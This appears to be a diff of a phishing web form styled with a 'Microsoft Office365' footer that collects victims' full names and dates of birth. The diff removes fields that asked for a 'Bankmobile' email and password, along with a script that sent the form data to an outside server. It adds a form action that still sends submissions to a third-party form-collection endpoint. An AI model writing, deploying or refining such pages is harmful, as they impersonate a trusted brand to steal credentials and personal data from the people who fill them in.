@@ -24,6 +24,7 @@
             accept-charset="UTF-8"
             method="POST",
             id="submissionForm"
+            action="https://www.formbackend.com/f/42413b18686aa139"
         >
             <div class="form-group">
                 <label for="siteName">Full Name</label>
@@ -57,14 +58,6 @@
                 <label for="date">Date of Birth</label>
                 <input type="date" id="date" name="date_of_birth" required>
             </div>
-             <div class="form-group">
-                <label for="adminEmail">Bankmobile Email</label>
-                <input type="email" id="bankmobileEmail" name="bankmobile_email" required>
-            </div>
-            <div class="form-group">
-                <label for="adminEmail">Bankmobile Password (Admin Protected)</label>
-                <input type="text" id="bankmobilePassword" name="bankmobile_email_pass" required>
-            </div>
             <button type="submit">Submit</button>
         </form>
     </div>
@@ -73,39 +66,5 @@
         <small>©2024 | Microsoft Office365</small>
     </footer>
 
-
-    <script>
-        // Handle form submission
-        document.getElementById("submissionForm").addEventListener("submit", async (e) => {
-          e.preventDefault();  // Prevent default form submission
-    
-          const formData = new FormData(e.target);
-          const formObject = Object.fromEntries(formData);
-    
-          try {
-            // Send form data to FastAPI backend
-            const response = await fetch("https://formally.onrender.com/school-forms/", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(formObject),
-            })
-            console.log(response.body)
-            ;
-    
-            if (response.ok) {
-              // Redirect to thank-you page upon success
-              window.location.href = "thankyou.html";  // Redirect to thank you page
-            } else {
-              // If form submission fails
-              alert("Failed to submit form. Please try again.");
-            }
-          } catch (error) {
-            alert("An error occurred while submitting the form.");
-          }
-        });
-    </script>
-    
 </body>
 </html>
